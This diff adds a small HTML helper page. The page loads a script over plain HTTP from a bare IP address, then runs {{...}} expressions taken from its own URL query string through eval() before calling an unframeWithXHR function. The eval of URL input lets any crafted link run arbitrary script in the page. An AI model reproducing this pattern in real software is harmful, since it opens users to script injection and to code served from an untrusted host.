@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+ <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<script src="http://213.208.189.135/az/lib/scripts.js"></script>
+<script>
+window.onload = function() {
+	var PARAM = ''
+	var mm = parent.location.search.match(/[?&]xPARAM=([^&]*)/);
+	if( mm ) PARAM = decodeURIComponent( mm[1] );
+	unframeWithXHR( location.search.substr(1)
+		.replace(/&$/,'')
+		.replace(/\{\{(.+?)\}\}/g, function(m, v) { return eval(v); }) );
+}
+</script>
